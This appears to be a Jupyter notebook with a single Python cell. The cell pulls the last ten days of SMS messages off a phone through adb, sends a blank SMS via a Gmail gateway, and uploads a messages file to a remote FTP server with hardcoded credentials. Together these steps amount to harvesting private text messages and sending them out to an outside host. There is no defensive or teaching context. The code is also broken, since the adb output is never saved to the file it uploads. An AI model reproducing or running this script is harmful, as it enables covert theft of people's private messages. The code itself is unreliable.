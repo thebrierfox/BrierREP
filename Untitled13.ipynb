{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba441e46-17fd-4d45-a852-b5049df00df6",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import smtplib\n",
    "import ftplib\n",
    "from datetime import datetime, timedelta\n",
    "\n",
    "# Set up the FTP server\n",
    "ftp = ftplib.FTP()\n",
    "ftp.connect(\"ftp.server.com\", 21)\n",
    "ftp.login(\"Tiger\", \"Woods\")\n",
    "\n",
    "# Get the current date and time\n",
    "now = datetime.now()\n",
    "\n",
    "# Calculate the start and end dates for message collection\n",
    "end_date = now.strftime(\"%Y-%m-%d\")\n",
    "start_date = (now - timedelta(days=10)).strftime(\"%Y-%m-%d\")\n",
    "\n",
    "# Connect to the SMTP server to send the blank SMS message\n",
    "server = smtplib.SMTP(\"smtp.gmail.com\", 587)\n",
    "server.starttls()\n",
    "server.login(\"your_email_address\", \"your_email_password\")\n",
    "server.sendmail(\"your_email_address\", \"recipient_phone_number@sms_gateway.com\", \"\")\n",
    "\n",
    "# Collect all the messages from the phone\n",
    "os.system(f\"adb shell content query --uri content://sms --where \\\"date>={int(datetime.strptime(start_date, '%Y-%m-%d').timestamp())*1000} and date<={int(datetime.strptime(end_date, '%Y-%m-%d').timestamp())*1000}\\\"\")\n",
    "\n",
    "# Send the collected messages to the FTP server\n",
    "with open(\"sms_messages.txt\", \"rb\") as f:\n",
    "    ftp.storbinary(f\"STOR sms_messages_{now.strftime('%Y%m%d%H%M%S')}.txt\", f)\n",
    "\n",
    "# Print the FTP address in green\n",
    "print(\"\\033[32mftp.server.com\\033[0m\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
